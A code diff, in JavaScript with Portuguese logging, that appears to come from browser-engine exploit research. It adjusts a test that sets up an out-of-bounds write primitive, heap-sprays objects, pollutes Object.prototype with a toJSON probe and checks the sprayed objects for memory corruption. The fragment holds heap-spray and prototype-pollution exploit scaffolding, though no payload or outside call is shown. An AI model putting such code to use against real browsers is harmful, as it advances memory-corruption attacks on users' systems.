@@ -14,7 +14,7 @@ class MyComplexObject {
         this.id = `MyObj-${id}`;
         this.value1 = 12345;
         this.value2 = "initial_state";
-        this.marker = 0xCAFECAFE; // Marcador para verificar integridade
+        this.marker = 0xCAFECAFE; 
     }
 
     checkIntegrity() {
@@ -31,12 +31,10 @@ class MyComplexObject {
             logS3(`!! ${this.id} - FALHA DE INTEGRIDADE! value2 esperado "initial_state", obtido "${this.value2}" !!`, 'critical', FNAME_CHECK);
             return false;
         }
-        // logS3(`${this.id} - Verificação de integridade OK.`, 'good', FNAME_CHECK);
         return true;
     }
 
     action() {
-        // Ação simples para ver se o objeto ainda é funcional
         return this.id + " acted, value1 is " + this.value1;
     }
 }
@@ -51,12 +49,10 @@ export function toJSON_ProbeGenericObject() {
         props: {}
     };
     try {
-        // Tenta listar algumas propriedades se for um objeto comum
         if (typeof this === 'object' && this !== null) {
             for (const prop in this) {
                 if (Object.prototype.hasOwnProperty.call(this, prop)) {
                     try {
-                        // Limita o que é logado para evitar objetos muito grandes ou recursivos
                         if (['id', 'value1', 'value2', 'marker'].includes(prop) && typeof this[prop] !== 'function') {
                            result_payload.props[prop] = String(this[prop]).substring(0, 50);
                         }
@@ -102,6 +98,7 @@ export async function executeSprayAndCorruptComplexObjectsTest() {
     await triggerOOB_primitive();
     if (!oob_array_buffer_real) {
         logS3("Falha OOB Setup. Abortando.", "error", FNAME_TEST);
+        sprayed_objects.length = 0;
         return;
     }
 
@@ -111,6 +108,7 @@ export async function executeSprayAndCorruptComplexObjectsTest() {
     } catch (e_write) {
         logS3(`   ERRO na escrita OOB: ${e_write.message}. Abortando sondagem.`, "error", FNAME_TEST);
         clearOOBEnvironment();
+        sprayed_objects.length = 0;
         return;
     }
     
@@ -126,7 +124,7 @@ export async function executeSprayAndCorruptComplexObjectsTest() {
 
     try {
         Object.defineProperty(Object.prototype, ppKey_val, {
-            value: toJSON_ProbeGenericObject,
+            value: toJSON_ProbeGenericObject, // Usa a toJSON genérica deste arquivo
             writable: true, configurable: true, enumerable: false
         });
         pollutionApplied = true;
@@ -146,11 +144,11 @@ export async function executeSprayAndCorruptComplexObjectsTest() {
             let errorDuringProbe = null;
 
             try {
-                integrityOK = obj.checkIntegrity(); // Verifica se as propriedades originais foram alteradas
+                integrityOK = obj.checkIntegrity(); 
                 if (!integrityOK) {
                     logS3(`   !!!! CORRUPÇÃO DE PROPRIEDADE DETECTADA em sprayed_objects[${i}] ANTES de stringify !!!!`, "critical", FNAME_TEST);
                 }
-                actionResult = obj.action(); // Tenta chamar um método
+                actionResult = obj.action(); 
                 stringifyResult = JSON.stringify(obj);
 
             } catch (e_probe) {
@@ -160,7 +158,7 @@ export async function executeSprayAndCorruptComplexObjectsTest() {
 
             if (!integrityOK || errorDuringProbe) {
                 corruption_detected_in_sprayed = true;
-                logS3(`   Objeto Corrompido: sprayed_objects[${i}].id = ${obj.id}`, "critical", FNAME_TEST);
+                logS3(`   Objeto Corrompido: sprayed_objects[${i}].id = ${obj.id || 'ID inacessível'}`, "critical", FNAME_TEST);
                 logS3(`     Integridade: ${integrityOK}, Resultado Ação: ${actionResult}, Erro Sonda: ${errorDuringProbe ? errorDuringProbe.message : 'Nenhum'}`, "info", FNAME_TEST);
                 logS3(`     Resultado Stringify (se houve): ${stringifyResult ? JSON.stringify(stringifyResult) : 'N/A'}`, "info", FNAME_TEST);
                 document.title = `CORRUPTED ComplexObj @ ${i}!`;
@@ -182,8 +180,7 @@ export async function executeSprayAndCorruptComplexObjectsTest() {
 
     logS3(`--- Teste Spray de Objetos Complexos CONCLUÍDO ---`, "test", FNAME_TEST);
     clearOOBEnvironment();
-    // Limpar o array grande
-    sprayed_objects.length = 0;
-    globalThis.gc?.(); // Sugere coleta de lixo se disponível
+    sprayed_objects.length = 0; 
+    globalThis.gc?.(); 
     document.title = corruption_detected_in_sprayed ? document.title : `Spray Complex Done`;
 }
